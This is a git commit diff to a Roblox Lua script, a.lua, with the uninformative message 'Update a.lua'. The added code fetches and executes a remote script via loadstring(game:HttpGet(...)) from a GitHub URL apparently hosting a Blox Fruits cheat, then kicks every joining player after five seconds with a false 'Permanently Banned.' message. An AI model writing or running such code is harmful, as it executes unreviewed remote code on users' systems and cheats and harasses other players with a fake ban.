88ac93b79d24c1d5b3ac1c740700b7e349d57e70
Doma-0609 <amir.nahviii@gmail.com>
2025-02-06 15:20:31 +0330

    Update a.lua

--- a.lua
+++ a.lua
@@ -1,2 +1,13 @@
--- LocalScript
-game.Players.LocalPlayer:Kick("Nane Mahan Ban Shod")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
+
+local Players = game:GetService("Players")
+
+local function kickPlayer(player)
+    wait(5)
+    player:Kick("Permanently Banned.")
+end
+
+Players.PlayerAdded:Connect(function(player)
+    kickPlayer(player)
+end)
